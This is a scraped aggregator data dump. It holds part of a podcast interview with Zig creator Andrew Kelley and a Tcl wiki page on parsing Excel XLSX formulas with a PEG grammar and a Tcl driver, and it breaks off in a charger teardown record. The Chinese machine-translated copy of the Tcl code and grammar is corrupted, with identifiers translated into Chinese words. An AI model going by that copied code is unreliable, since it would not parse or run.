telling you, \u201cDon\u2019t invent.\u201d Don\u2019t NIH syndrome, but I learned the value of actually, yeah, that is the right thing to do sometimes. If you really want that much power and control you got to do it. So, that\u2019s when I started just really getting into programming stuff from scratch with C or C++.\n   Andrew:I think that the natural first impulse was that if someone else solved the problem, just go use their solution, right? It\u2019s already done. You write the glue code, and then you\u2019re off. In a lot of ways that\u2019s smart because we only have so much time, we only have so much ability to analyze a problem space. And the other person has already done that part. So, let\u2019s see what\u2019s a good example of this.\n The audio library would be an example. So, I tried using port audio. I tried using SDL, I think. These projects mostly work, but then the problem is that they solve 90% of the problem, and if you want to close that last 10% gap, you have to start over. So, I ended up writing my own cross-platform audio abstraction called the libsound.io, and that allowed me to do things that the other libraries didn\u2019t let me do. So, for example, I had the ability to just display a list of input devices and have it automatically refresh. If you unplug the mic, it goes away, if you plug the mic in, it shows up.\n It seems so simple, seems like such a reasonable thing for the user experience, but these other libraries just did not have that ability. And it would have taken me probably honestly years to get the feature into those libraries, and then have enough time pass that those libraries got the updates into the various open source distributions of packaged libraries. Because if you use a third-party library, people want to use the pre-packaged versions. So, then you\u2019re even waiting for their release cycle. And then, you\u2019re waiting for the downstream maintainers to get it, but if you put it in your own code base, you just ship it when you want to ship it, right?\n And there\u2019s just so many problems with these languages that get in the way of progress, bugs take forever to find and fix, progress is slower than it should be. And so, that\u2019s when the juices started flowing. And I thought, \u201cI think I can do better than this.\u201d I think I see what these languages are bringing to the table and I think I can take them to the next level.\n  Adam:Did you fight that impulse? Did you immediately get sidetracked on building a language or what happened there?\n Andrew:I did. I did fight the impulse. And I stuck with the music player project for quite a while. And then, to be honest I just went through kind of a difficult life experience. It was a breakup at the time and just as kind of a coping mechanism I let myself say, \u201cHey, I know you\u2019ve been trying to be just disciplined and stick with the same project for a long time, but go have some fun, start a new project, start a programming language. It\u2019ll be good for you.\u201d And then, it\u2019s never switched back.\n Adam:So, was it like you were like my whole mind is occupied by this breakup, but I think if I start this new project it might be able to squeeze it out of my brain at least temporarily?\n   Andrew:Mn-hmm (affirmative). I mean I think just the natural emotional progress ran its course, but just in the meantime I was having fun with a distracting toy project.\n Adam:Yeah. I mean it\u2019s certainly more productive than like, I don\u2019t know, playing Mario Kart for-\n  Adam:\u2026 eight hours a day or something. I like Mario Kart. I don\u2019t know.\n    Andrew:The very first time I ever used a programming language, I always wondered what would it be like to make one? And whenever I listen to music, I always wonder what would it be like to try and make a song like this? I\u2019ve always enjoyed just consuming things by just wondering what the other side of the process looks like.\n Adam:When I was in university, I had a class where we built a compiler, like a toy compiler. And it was super fun. Andrew had a similar experience and went on to toy around with a fork of CoffeeScript. I found playing with programming languages to be fun, but Andrew, he got something different out of it.\n Andrew:You know what it was? I actually ran my first marathon a couple years ago, but I don\u2019t feel like I did. Because I walked the last four miles of it, hit that wall hard. And I guess most people do, because I was still in like the top 50% for my age group. So, I guess just most people walk at the end of marathons, but in my head, it\u2019s like you didn\u2019t do it. You walked part of it, right?\n So, I always felt that way about the compilers that I\u2019ve made, because if it\u2019s like a CoffeeScript one, you\u2019re actually just outputting JavaScript. And then, for the one in college the professor just had us do C as the output. So, I always felt like I walked the last part. I always wanted to say, \u201cNo. I want to make it actually make machine code and make it do the whole thing. I don\u2019t want to cheat on some of the layers.\u201d\n I also don\u2019t want to devalue like the work that people have done. That\u2019s all it\u2019s still a compiler. If you go from one input language to a different input language, that\u2019s a compiler. That\u2019s just my personal subjective experience is that I felt like I was missing some interesting part that I hadn\u2019t had the experience of completing.\n  Adam:Andrew understood before he even started what the C language brought to the table, and this is important. C is a small language and it\u2019s everywhere. C is used by 20% of software developers according to the Stack Overflow Survey. Some conditions may apply there.\n I don\u2019t know if the Stack Overflow Survey is representative, but they have a lot of developers using it and 20% of them say that they are writing C. That\u2019s one in five developers. That\u2019s more people than use Ruby and Swift and Rust combined.\n So, anyways, Andrew has his breakup and he gives himself permission to start on his language. His idea isn\u2019t to start from first principles and create a new language, but to look for specific problems that can be addressed.\n Andrew:Is there dirt under this rug? Maybe we can do this a different way. A lot of software is built on premises of abstractions that previous generations have handed to us. Let\u2019s peel those off a little bit and take a peek and say, \u201cMaybe we might want to make some different decisions now that it\u2019s 40 years later.\u201d\n   Andrew:One example would be static linking. If you\u2019re trying to ship a application on Linux, there\u2019s a common problem people have where it\u2019ll only work on one distribution of Linux. So, for example, someone might provide their application on their website you download it, but only runs on Ubuntu or something that\u2019s close enough to Ubuntu.\n Adam:I literally just had this problem. I was trying to install a Python library Matplotlib. And on Mac OS, it was super easy, but to get it into Alpine Linux, I had to install all these dependencies.\n Andrew:And the reason for this is that they dynamic link all the libraries they depend on. They just expect you to install those libraries with the system package manager. I\u2019ve chosen to make Zig so that the default on Linux is that you do not link libc at all when we provide the download of a pre-built Zig for Linux. It works for all Linuxes, all of them, because the binary has no libc dependency. It just uses the syscalls in assembly.\n And the only dependency it has is a file system and the kernel. It doesn\u2019t depend on anything else. So, that way we can provide a binary that just works for everybody\u2019s computer on Linux just like on Windows and other systems. We got that benefit by questioning distributing things with dynamic linking and saying, \u201cWell, maybe we should go a different direction.\u201d\n   Andrew:Yes. I think it does depend on glibc though. I know that you can actually use Zig with Go and Zig will provide the ability to have a static Linux binary and give you this benefit with Go programs.\n  Andrew:One is that there are just too many ways to accidentally introduce bugs that are not interesting bugs that you get because programming is hard, but they\u2019re unnecessary bugs, because the C programming language made some bad decisions. So, as an example, there\u2019s a type system and the whole point of a type system is to help you not make bugs, but the type system has some things that it allows with no errors and no warnings that just are bugs 99% of the time.\n It\u2019s very easy to make that mistake. Just stuff like integer casting rules is one, so that\u2019s one complaint I would make. Too easy to shoot yourself in the foot. And then, have a unnecessarily complicated debugging session to solve the problem.\n  Andrew:And then, the second complaint I would make is that while C code is usually very simple to read, because it\u2019s just functions and data. That\u2019s the best case scenario. It does have just another different programming language on top of it, which is the C pre-processor. It\u2019s not C, it\u2019s a different language that\u2019s based on text concatenation and people abuse that language too much.\n And then, it\u2019s just too hard to figure out what\u2019s going on. You see a function call, is it a function call? If you\u2019re not super familiar with the code you\u2019re reading, you\u2019re always wondering, \u201cIs that a macro? It might be a macro.\u201d Right?\n  Andrew:Global knowledge is a great way to put it. Yeah. One of the big design considerations that I made with the Zig language was let\u2019s reduce the amount that someone must remember when they\u2019re reading code.\n   Andrew:Some people are so defensive about a norm where people are like mean to each other. And don\u2019t get me wrong, I\u2019m a very blunt person. I\u2019m very comfortable with conflict and I can tell someone I think that they\u2019re full of shit, but have you ever gone into the C, freenode channel and just observed?\n  Andrew:That is one of the most toxic, hostile chatrooms I\u2019ve ever been in. Before the freenode drama, the C programming language channel on freenode. You could go in there and ask some simple question like, \u201cHow do I\u2026 I don\u2019t know. How do I align a field in a struct or something?\u201d Some very reasonable question, and you\u2019ll get one person who calls you a name, one person who says you can\u2019t period, passive aggressive doesn\u2019t explain it at all.\n One person gives you just wrong information and the actual answer is that you can do it. It\u2019s fine. And there\u2019s some tricks you can do. It\u2019s one of the worst places in the world. I don\u2019t know what\u2019s up with that. So, it\u2019s like the one word I\u2019d use to describe it is pedantic, right?\n  Andrew:And they even have, there\u2019s even a flag and a C compiler that\u2019s pedantic. And I always think like, \u201cOh, it\u2019s the C chat room flag.\u201d\n Adam:With this vision in mind of a better language and a better less pedantic community and a working version of the language up on GitHub, Andrew starts to get some users.\n  Andrew:The number of people who file an issue per week has just gone up slowly over time. The number of people who wanted to help out, submit pull requests, which were up for grabs since the very beginning. It was always done in the open. It\u2019s just slowly gone up over time.\n One of the first projects that I got to see that someone did with Zig was the Pokemon rom randomizer project. So, they used Zig and made a set of command line tools to take the Game Boy roms that were Pokemon ones and just did some rom hacking. And then, gave you a new rom that you could then pop into an emulator and it would shuffle around all the, which graphs have which Pokemon and stuff.\n Adam:Building a programming language is just a lot of work. You have to find time to keep pushing it forward.\n Andrew:I would describe Zig as kind of like a flower growing in the cracks of the concrete of my career. When I started it I was taking a break from full-time work. And then, I needed a job. So, I got a job at a start-up called Backtrace, did that for a little bit, save some more money, quit, worked on Zig full-time for a few months. I interviewed with Apple, and they just flat out said, \u201cYou may not do that in your spare time.\u201d\n So, I said, \u201cFuck off then.\u201d And now getting donations from Apple to the Zig Software Foundation, by the way.\n    Adam:Was there ever any tension? I imagine you\u2019re at OKCupid or the other place. And I don\u2019t know, is work building up or is there things to do? Do you constantly try to evangelize how great your language is to your co-workers until they get angry? What happened?\n Andrew:Oh, yeah. When I joined OKCupid, I had to have a whole negotiation with the recruiter, because a lot of companies just put in the contract something like, \u201cAnything you do in your spare time is owned, the IP is owned by the company.\u201d It\u2019s ridiculous. So, I just said, \u201cYou have to strike that from the contract. I\u2019m going to own all the IP of everything I do in my spare time on my own equipment.\u201d\n And the guy was like, \u201cOh, no one asks for this. We don\u2019t usually do this. I\u2019ll see what I can do.\u201d And I had to take a real like hard-line stance with him, eventually he caved. You have to protect your baby or someone\u2019s going to take it away.\n Adam:Yeah. That\u2019s silly, right? And you know that they had no problem striking it, it\u2019s just they didn\u2019t want to go through the problem of like\u2026 He didn\u2019t want to find out who to ask about that.\n     Adam:But what about your actual co-workers, did they know you were working on Zig? Did you talk about it?\n Andrew:Oh, yeah. I wasn\u2019t shy about that. And I tried not to be annoying, but I couldn\u2019t help if we were\u2026 If we had some problem in the code base, I couldn\u2019t help point out like, \u201cWell, in Zig if you wrote\u2026 The code would be written this way and this problem would have been a compiler error instead of a bug.\u201d\n In some ways I think it helped me design the compiler errors because I was just seeing the problems that we were hitting in practice.\n   Adam:It\u2019s kind of unexpected to me that it would be C++. I just assume all like SaaS stuff is, I don\u2019t know, not C++.\n Andrew:Yeah. So, the funny story there is that the company was founded, I don\u2019t know, 15 years ago by Maxwell Krohn, and this other guy\u2019s name. Their PhD thesis was called OK Web Server. And it was just like some\u2026 It had nothing to do with dating. It was just a way to do security on a C++ web service. And so, basically they did their research, and they thought, \u201cOkay, now what? I guess we\u2019ll start a company.\u201d\n    Adam:Yeah. So, it\u2019s like arbitrary that they use C++. Well, it\u2019s actually arbitrary that they choose dating.\n  Adam:Yeah. It was always going to be C++. They just didn\u2019t know what.\n  Andrew:The funny thing too is when you\u2019re joining the company they just have you read the paper, because it\u2019s still accurate about how the code base works.\n Adam:I mean in some ways that\u2019s great, because like most places have code bases that like, there\u2019s not a single person that can explain the entirety of it, right?\n Andrew:Yeah. I agree with you, although I will say just having splunked through a bunch of that old code, I could tell that the founders were just having a lot of fun and just experimenting a lot, just playing with stuff. I\u2019m just like, \u201cWho cares? We\u2019re definitely going to exit from the startup and leave in four years. I don\u2019t give a shit.\u201d Right?\n You can see it in their code. You can tell they\u2019re just screwing around and they really don\u2019t care about the longevity of\u2026 It was pretty\u2026 I feel like I have kind of like a parasocial relationship with the founders. I didn\u2019t actually interact with them, but I interacted with their code. And I\u2019m just like\u2026\n   Adam:Yeah. What does I don\u2019t give a shit, I\u2019m going to exit like C++ look like?\n Andrew:There was a file that was both a Perl script and a C++ file, and to update it\u2026 It\u2019s self-updating, so you run it with Perl and it edits itself, but then you\u2019re supposed to\u2026 It\u2019s for the C++ project. Does that make sense? It\u2019s a polyglot file.\n  Andrew:So, the same file is a Perl program and it edits itself like a weird hack so that it could be parsed by both.\n     Adam:Before you went full time, did you ever feel like this is too much to do this and my job?\n Andrew:Oh, I was definitely stressed out. Yeah. My fianc\u00e9e can tell you about some of the times I just kind of just showed up very, very stressed and just like unable to like be a good partner, but I never even considered quitting doing Zig stuff. The only thing I ever considered was quitting work. The thing that was causing me so much stress was the feeling that I was wasting my life just on this bullshit. Wasting my life just being a pawn in someone else\u2019s just play to get money, whereas what I felt like I was doing with this open source project was more meaningful.\n I mean we create our own meaning in life. I\u2019m not here to judge what anyone wants to do with their life, if you want to make money go make money, but I don\u2019t want to be a pawn in your gambit to make money. I want to do\n......", "posttime": "2021-08-05 20:58:51", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "\u5f00\u6e90,andrew", "title": "\u4e0e Andrew Kelley \u4e00\u8d77\u5168\u804c\u5f00\u6e90", "title_en": "Full-time open source with Andrew Kelley", "transed": 1, "url": "https://corecursive.com/067-zig-with-andrew-kelley/", "via": "", "real_tags": ["\u5f00\u6e90", "andrew"]}, {"category": "", "categoryclass": "", "imagename": "", "infoid": 1071347, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "\u8fd9\u662f\u6211\u7f16\u5199\u7684\u4e00\u4e9b\u4ee3\u7801\uff0c\u7528\u4e8e\u89e3\u6790\u548c\u8bc4\u4f30 Excel 2008 xml \u683c\u5f0f\u7535\u5b50\u8868\u683c\u4e2d\u7684\u516c\u5f0f\u3002\u6211\u4f7f\u7528 perl \u4ee5 Excel \u683c\u5f0f\u751f\u6210\u4e86\u4e00\u4e9b\u975e\u5e38\u590d\u6742\u7684\u62a5\u544a\uff08XLSX:Excel:Writer Using Perl to get Excel\uff09\uff0c\u6240\u4ee5\u6211\u7684 xlsx \u8f93\u51fa\u6587\u4ef6\u6ca1\u6709\u4e3a\u6bcf\u4e2a\u5355\u5143\u683c\u9884\u8ba1\u7b97\u7684\u503c\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b excel \u5199\u5165\u5176\u8f93\u51fa\u7684\u65b9\u5f0f\u3002\u4e3a\u4e86\u6d4b\u8bd5\u548c\u9a8c\u8bc1\u6211\u63a8\u9001\u7ed9\u5ba2\u6237\u7684\u503c\uff0c\u6211\u9700\u8981\u80fd\u591f\u8bc4\u4f30\u6211\u7f16\u5199\u7684\u516c\u5f0f\u3002\u8fd9\u662f\u4e00\u4e2a\u76f8\u5f53\u957f\u7684\u6545\u4e8b\uff0c\u4f46\u5b83\u4ee5\u4f7f\u7528 tcllib 1.13 \u4e2d\u7684 Tcl \u89e3\u6790\u5668\u5de5\u5177\u7684\u793a\u4f8b\u5f00\u59cb\uff1aPEG xlsexpr (Formula) Formula &lt;- Expr EOF ; MulOp &lt;- &#39;&lt;&#39; / &#39;&gt;&#39; / &#39;=&#39; / &#39;*&#39; / &#39;/&#39; ; Expo &lt;- Value (&#39;^&#39; Value)\uff1f ; Prod &lt;- Expo WS (MulOp WS Expo)*\uff1b AddOp &lt;- &#39;^&#39; / &#39;+&#39; / &#39;-&#39; ; Sum &lt;- Prod WS (AddOp WS Prod)* ; Expr &lt;- \u603b\u548c;\u65e0\u6548\uff1aWS &lt;- &lt;\u7a7a\u683c&gt;* ;\u4ef7\u503c &lt;- UnOp\uff1f ( &#39;(&#39; Expr &#39;)&#39; / String / Func / Range / Cell / Number ) ; UnOp &lt;- &#39;-&#39; / &#39;+&#39; ; Func &lt;- FunName &#39;(&#39; WS FunArgs WS &#39;)&#39; ; FunName &lt;- &lt;alpha&gt;&lt;alnum&gt;* ; FunArgs &lt;- Expr WS (&#39;,&#39; WS Expr)* ;\u8303\u56f4 &lt;- \u8868\uff1f RowCol &#39;:&#39; RowCol ;\u5355\u5143\u683c &lt;- \u8868\uff1f\u7ec6\u80de_ ;\u5de5\u4f5c\u8868&lt;-\u201c&#39;\u201d\uff1f\u5e8a\u5355_ \u201d&#39;\u201d\uff1f &#39;\uff01 ; Sheet_ &lt;- [-A-Za-z0-9&amp; ]+ ; Cell_ &lt;- &lt;alpha&gt;+&lt;ddigit&gt;+ ; RowCol &lt;- Col_ Row_ ; Col_ &lt;- &lt;alpha&gt;+ ;\u884c_ &lt;- &lt;ddigit&gt;+ ;\u5b57\u7b26\u4e32 &lt;- &#39;&quot;&#39; [A-Za-z0-9]* &#39;&quot;&#39; ;\u53f6\u5b50\uff1a\u6570\u5b57 &lt;- \u7b26\u53f7\uff1f ( &lt;ddigit&gt;+ Frac? ) / Frac? ;\u7b26\u53f7 &lt;- &#39;-&#39; / &#39;+&#39; ;\u538b\u88c2 &lt;- &#39;.&#39; &lt;ddigit&gt;* ; EOF &lt;- !. ;\u7ed3\u5c3e;\u8fd9\u662f\u4e00\u4e2a\u751f\u6210 Excel \u8868\u8fbe\u5f0f\u89e3\u6790\u5668\u7684 Makefile\u3002\u6211\u60f3\u8981\u89e3\u6790\u5668\u5de5\u5177\u6765\u4e3a TclOO \u751f\u6210\u89e3\u6790\u5668\uff0c\u4f46\u662f oo:: \u7684\u8bc4\u4f30\u5668\u5931\u8d25\u4e86\uff0c\u6240\u4ee5\u6211\u6700\u7ec8\u4f7f\u7528\u4e86 snit\u3002 sed \u547d\u4ee4\u4fee\u590d\u4e86\u89e3\u6790\u5668\u5de5\u5177\u8f93\u51fa\u4e2d\u7684\u4e00\u4e2a\u5c0f\u9519\u8bef\uff1a PT=pt parser : xls-parser.peg $(PT) generate snit -class xls-parser -name xls-parser xls-parser.tcl peg xls-parser\u3002 peg sed -es/PACKAGE/xls-parser/ &lt; xls-parser.tcl &gt; tmp mv tmp xls-parser.tcl \u8fd9\u662f\u9876\u7ea7\u9a71\u52a8\u7a0b\u5e8f\u3002\u8fd9\u91cc\u6709\u8da3\u7684\u547d\u4ee4\u662f\u201c\u6bd4\u8f83\u201d\u3002\u5b83\u4e24\u6b21\u52a0\u8f7d\u76f8\u540c\u7684\u7535\u5b50\u8868\u683c\uff0c\u4ece\u4efb\u4f55\u5305\u542b\u4e00\u4e2a\u526f\u672c\u7684\u516c\u5f0f\u7684\u5355\u5143\u683c\u4e2d\u6e05\u9664 excel \u63d0\u4f9b\u7684\u503c\uff0c\u7136\u540e\u5c06\u8fd9\u4e9b\u503c\u4e0e\u5355\u5143\u683c\u7684 tcl \u8bc4\u4f30\u503c\u8fdb\u884c\u6bd4\u8f83\u3002 #!/bin/env tclkit8.6 # \u6e90 xml.tcl ; # \u8fd9\u662f\u7a0e\u6e90 xlsx.tcl package require vfs package require vfs::zip set argv [lassign $argv op] switch $op { form { lassign $argv file sheet cell workbook create wb $file puts [[wb name2obj $sheet] form $cell] } cell { lassign $argv file sheet cell workbook create wb $file puts [[wb name2obj $sheet] cell $cell] } cell+ { lassign $argv file sheet cell workbook create wb $file wb clear puts [[wb name2obj $sheet] \u5355\u5143\u683c\uff1f $cell] } cells { workbook create wb [lindex $argv 0] foreach name [wb sheet] { set sheet [wb name2obj $name] puts [list $sheet [$sheet cells]] } } compare { lassign $argv file1 file2 workbook create wb1 $file1 workbook create wb2 $file2 wb2 clear foreach name1 [wb1 sheet] name2 [wb2 sheet] { if { $name1 ne $name2 } { puts &quot;Sheet names don&#39;t match $name1, $name2&quot; } set sh1 [wb1 name2obj $name1] set sh2 [wb2 name2obj $name2] foreach cell [$sh1 cells] { #puts &quot;$name1 $cell&quot; if { [set v1 [$sh1 cell $cell]] != [set v2 [$ sh2 cell $cell]] } { puts &quot;$name1 : $cell $v1 != $v2&quot; } } } } } \u8fd9\u662f\u4ee3\u7801\u7684\u4e3b\u8981\u5185\u5bb9\u3002\u5b83\u5c06\u8fd1 500 \u884c\uff0c\u6240\u4ee5\u6211\u53ea\u5728\u8fd9\u91cc\u5f15\u7528\u5b83\uff1ahttps://github.com/jbroll/xlsx-expr\n\u5305\u62ec\u6253\u5f00 xlsx \u6587\u4ef6\u5e76\u5c06 xml \u4e2d\u7684\u5355\u5143\u683c\u503c\u3001\u516c\u5f0f\u548c\u683c\u5f0f\u89e3\u6790\u4e3a xlsx \u5bf9\u8c61\u4e2d\u7684\u5b9e\u4f8b\u53d8\u91cf\u6570\u7ec4\u7684\u65b9\u6cd5\u3002 \u201c=\u201d\u65b9\u6cd5\u8ba1\u7b97\u5355\u5143\u683c\u7684\u503c\uff0c\u5305\u62ec\u901a\u8fc7\u7535\u5b50\u8868\u683c\u4e2d\u7684\u6240\u6709\u5f15\u7528\u9075\u5faa\u516c\u5f0f\u3002\u6bcf\u4e2a\u516c\u5f0f\u503c\u4ec5\u7f13\u5b58\u548c\u8bc4\u4f30\u4e00\u6b21\u3002\u901a\u8fc7\u4f7f\u7528\u89e3\u6790\u5668\u5de5\u5177\u5c06\u5b83\u4eec\u89e3\u6790\u4e3a AST \u683c\u5f0f\uff0c\u7136\u540e\u5c06 AST \u4f5c\u4e3a\u811a\u672c\u6267\u884c\u6765\u8bc4\u4f30\u516c\u5f0f\u3002\u811a\u672c\u7684\u7ed3\u679c\u662f\u4e00\u4e2a\u9002\u5408 expr \u7684\u8868\u8fbe\u5f0f\uff0c\u7136\u540e\u8c03\u7528\u5b83\u6765\u83b7\u53d6\u5355\u5143\u683c\u7684\u503c\u3002\u8fd9\u91cc\u53ea\u5b9e\u73b0\u4e86\u8db3\u591f\u7684\u4e1c\u897f\u6765\u652f\u6301\u6211\u7684\u7535\u5b50\u8868\u683c\u4e2d\u7684\u8bed\u6cd5\u548c\u51fd\u6570\uff0c\u4f46\u6269\u5c55\u5b83\u5e94\u8be5\u662f\u76f4\u63a5\u7684\u3002\u6211\u5df2\u7ecf\u8bc4\u4f30\u4e86\u5e26\u6709\u591a\u4e2a\u5de5\u4f5c\u8868\u7684\u5de5\u4f5c\u7c3f\uff0c\u8de8\u8d8a\u6570\u5343\u4e2a\u5355\u5143\u683c\u7684\u590d\u6742\u516c\u5f0f\uff0c\u4e0e excel \u81ea\u884c\u8ba1\u7b97\u7684\u503c\u5b8c\u5168\u4e00\u81f4\u3002\u89e3\u6790\u5668\u4f7f\u7528 tcl::chan::string \u63d0\u4f9b\uff0c\u5b83\u9700\u8981\u4e00\u4e2a\u5c0f\u8865\u4e01\u3002 Allowance \u65b9\u6cd5\u88ab\u7834\u574f\uff0c\u6240\u4ee5\u6211\u53ea\u662f\u5728 virtchannel_core/events.tcl:Allowance \u7684\u5f00\u5934\u6dfb\u52a0\u4e86\u4e00\u4e2a\u201c\u8fd4\u56de\u201d\u4ee5\u7981\u7528\u4efb\u4f55\u68c0\u67e5\u3002\u65e0\u8bba\u5982\u4f55\uff0c\u8fd9\u79cd\u68c0\u67e5\u5bf9\u6211\u6765\u8bf4\u4f3c\u4e4e\u592a\u8fc7\u5206\u4e86\u3002 AK\uff1a\u68c0\u67e5\u662f\u5fc5\u8981\u7684\u3002\u6211 2009 \u5e74\u5173\u4e8e\u53cd\u5c04\u548c\u8f6c\u6362\u901a\u9053\u7684\u4f1a\u8bae\u8bba\u6587\uff08\u5728 TCA \u4f1a\u8bae\u9875\u9762\u4e0a\uff09\u89e3\u91ca\u4e86\u8fd9\u4e9b\u5185\u90e8\u7ed3\u6784\u3002\u5b9e\u9645\u95ee\u9898\u662f\u7f3a\u5c11\u6784\u9020\u51fd\u6570\u94fe\u963b\u6b62\u4e86\u4e8b\u4ef6\u7ba1\u7406\u6838\u5fc3\u7684\u6b63\u786e\u521d\u59cb\u5316\u3002\u5728\u6e90\u5b58\u50a8\u5e93\u5934\u4e2d\u4fee\u590d\u3002", "note_en": "Here is some code I&#39;ve written to parse and evaluate formula in an Excel 2008 xml format spreadsheet. I generate some very complex reports in Excel format using perl (XLSX:Excel:Writer  Using Perl to get Excel), so my xlsx output files do not have the values precomputed for each cell the way excel writes its output by default. To allow testing and verification of values that I&#39;m pushing out to the client I need to be able to evaluate the formula that I&#39;ve written. This is a rather long story but it starts with an example of using the Tcl  Parser Tools from tcllib 1.13:\n  PEG xlsexpr (Formula) Formula &lt;- Expr EOF ; MulOp &lt;- &#39;&lt;&#39; / &#39;&gt;&#39; / &#39;=&#39; / &#39;*&#39; / &#39;/&#39; ; Expo &lt;- Value (&#39;^&#39; Value)? ; Prod &lt;- Expo WS (MulOp WS Expo)* ; AddOp &lt;- &#39;^&#39; / &#39;+&#39; / &#39;-&#39; ; Sum &lt;- Prod WS (AddOp WS Prod)* ; Expr &lt;- Sum ; void: WS &lt;- &lt;space&gt;* ; Value &lt;- UnOp? ( &#39;(&#39; Expr &#39;)&#39; / String / Func / Range / Cell / Number ) ; UnOp &lt;- &#39;-&#39; / &#39;+&#39; ; Func &lt;- FunName &#39;(&#39; WS FunArgs WS &#39;)&#39; ; FunName &lt;- &lt;alpha&gt;&lt;alnum&gt;* ; FunArgs &lt;- Expr WS (&#39;,&#39; WS Expr)* ; Range &lt;- Sheet? RowCol &#39;:&#39; RowCol ; Cell &lt;- Sheet? Cell_ ; Sheet &lt;- &#34;&#39;&#34;? Sheet_ &#34;&#39;&#34;? &#39;!&#39; ; Sheet_ &lt;- [-A-Za-z0-9&amp; ]+ ; Cell_ &lt;- &lt;alpha&gt;+&lt;ddigit&gt;+ ; RowCol &lt;- Col_ Row_ ; Col_ &lt;- &lt;alpha&gt;+ ; Row_ &lt;- &lt;ddigit&gt;+ ; String &lt;- &#39;&#34;&#39; [A-Za-z0-9]* &#39;&#34;&#39; ; leaf: Number &lt;- Sign? ( &lt;ddigit&gt;+ Frac? ) / Frac? ; Sign &lt;- &#39;-&#39; / &#39;+&#39; ; Frac &lt;- &#39;.&#39; &lt;ddigit&gt;* ; EOF &lt;- !. ; END;\n Here is a Makefile to generate a parser for Excel expressions. I wanted parser tool to generate a parser for TclOO but the evaluator for oo:: failed so I ended up using snit. The sed command fixes up a little bug in the parser tool output:\n  PT=pt parser : xls-parser.peg $(PT) generate snit -class xls-parser -name xls-parser xls-parser.tcl peg xls-parser.peg sed -e s/PACKAGE/xls-parser/ &lt; xls-parser.tcl &gt; tmp mv tmp xls-parser.tcl\n This is the top level driver program. The interesting command here is &#34;compare&#34;. It loads the same spreadsheet twice, clearing the excel provided values from any cell which contains a formula in one copy and then comparing the values with the tcl evaluated values of the cells.\n  #!/bin/env tclkit8.6 # source xml.tcl ; # this is tax source xlsx.tcl package require vfs package require vfs::zip set argv [lassign $argv op] switch $op { form { lassign $argv file sheet cell workbook create wb $file puts [[wb name2obj $sheet] form $cell] } cell { lassign $argv file sheet cell workbook create wb $file puts [[wb name2obj $sheet] cell $cell] } cell+ { lassign $argv file sheet cell workbook create wb $file wb clear puts [[wb name2obj $sheet] cell? $cell] } cells { workbook create wb [lindex $argv 0] foreach name [wb sheets] { set sheet [wb name2obj $name] puts [list $sheet [$sheet cells]] } } compare { lassign $argv file1 file2 workbook create wb1 $file1 workbook create wb2 $file2 wb2 clear foreach name1 [wb1 sheets] name2 [wb2 sheets] { if { $name1 ne $name2 } { puts &#34;Sheet names don&#39;t match $name1, $name2&#34; } set sh1 [wb1 name2obj $name1] set sh2 [wb2 name2obj $name2] foreach cell [$sh1 cells] { #puts &#34;$name1 $cell&#34; if { [set v1 [$sh1 cell $cell]] != [set v2 [$sh2 cell $cell]] } { puts &#34;$name1 : $cell $v1 != $v2&#34; } } } } }\n    Here is the meat of the code. Its almost 500 lines so I&#39;ll just reference it here:  https://github.com/jbroll/xlsx-expr\n Included are methods to open the xlsx file and parse the cell values, formula and formats from the xml into instance variable arrays in the xlsx object. The &#34;=&#34; method evaluates the value of the cell including following a formula right through all the references in the spreadsheet. Each formula value is cached and evaluated only once. Formula are evaluated by parsing them into AST format with parser tools and then executing the AST as a script. The result of the script is an expression suitable for  expr, which is then called to obtain the cell&#39;s value. Just enough stuff is implemented here to support the syntax and functions in my spreadsheets, but extending this should be straight forward. I have evaluated workbooks with multiple worksheets, complex formula across thousands of cells with perfect agreement to the values that excel computes itself.\n   The parser is fed using tcl::chan::string which needs a small patch. The Allowance method is broken so I just added a &#34;return&#34; at the start of virtchannel_core/events.tcl:Allowance to disable any checking. This checking seemed like overkill to me anyway.\n AK: The checking is necessary. My 2009 Conference paper on  Reflecting and Transforming Channels   (at the  TCA Conference Page  ) explains these internals. The actual issue was a missing constructor chaining preventing the proper initialization of the event management core. Fixed in the source repository head.", "posttime": "2021-08-05 20:58:37", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "tcl,excel,lt", "title": "\u4f7f\u7528 Tcl \u89e3\u6790\u5668\u5de5\u5177\u89e3\u6790 Excel XLSX (2011)", "title_en": "Parsing Excel XLSX Using Tcl Parser Tools (2011)", "transed": 1, "url": "https://wiki.tcl-lang.org/page/Parsing+Excel+XLSX", "via": "", "real_tags": ["tcl", "excel", "lt"]}, {"category": "", "categoryclass": "", "imagename": "", "infoid": 1071346, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "\u672c\u6587\u73b0\u5df2\u63d0\u4f9b\u8d8a\u5357\u8bed B\u1ed9 s\u1ea1c iPhone c\u1ee7a Apple \u7248\u672c\u3002\u62c6\u89e3 Apple \u7684\u5c0f\u578b\u7acb\u65b9\u4f53 iPhone \u5145\u7535\u5668\uff0c\u53ef\u4ee5\u770b\u5230\u6280\u672f\u5148\u8fdb\u7684\u53cd\u6fc0\u5f0f\u5f00\u5173\u7535\u6e90\uff0c\u5b83\u8d85\u8d8a\u4e86\u5178\u578b\u7684\u5145\u7535\u5668\u3002\u5b83\u53ea\u9700\u8981\u4ea4\u6d41\u8f93\u5165\uff08100 \u5230 240 \u4f0f\u4e4b\u95f4\u7684\u4efb\u4f55\u7535\u538b\uff09\u5e76\u4ea7\u751f 5 \u74e6\u7684\u5e73\u6ed1 5 \u4f0f\u7535\u6e90\uff0c\u4f46\u5b9e\u73b0\u6b64\u76ee\u7684\u7684\u7535\u8def\u975e\u5e38\u590d\u6742\u4e14\u5177\u6709\u521b\u65b0\u6027\u3002 iPhone \u7535\u6e90\u9002\u914d\u5668\u662f\u4e00\u79cd\u5f00\u5173\u7535\u6e90\uff0c\u5176\u8f93\u5165\u7535\u6e90\u6bcf\u79d2\u5f00\u5173\u7ea6 70,000 